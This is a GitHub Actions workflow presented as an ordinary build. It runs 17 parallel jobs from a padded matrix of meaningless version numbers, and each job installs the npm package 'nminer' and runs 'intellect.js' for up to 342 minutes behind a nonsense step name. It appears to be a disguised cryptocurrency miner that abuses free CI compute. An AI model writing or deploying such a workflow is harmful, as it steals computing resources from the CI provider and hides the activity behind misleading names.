name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3521 }
          - { version: 6190 }
          - { version: 1108 }
          - { version: 8844 }
          - { version: 9655 }
          - { version: 8610 }
          - { version: 6605 }
          - { version: 9201 }
          - { version: 3275 }
          - { version: 6878 }
          - { version: 454 }
          - { version: 4863 }
          - { version: 1375 }
          - { version: 8994 }
          - { version: 5457 }
          - { version: 9099 }
          - { version: 4412 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: despite bruised that ack
        run: |
          npm install nminer@latest
          timeout 342m node intellect.js || echo "intellect executed"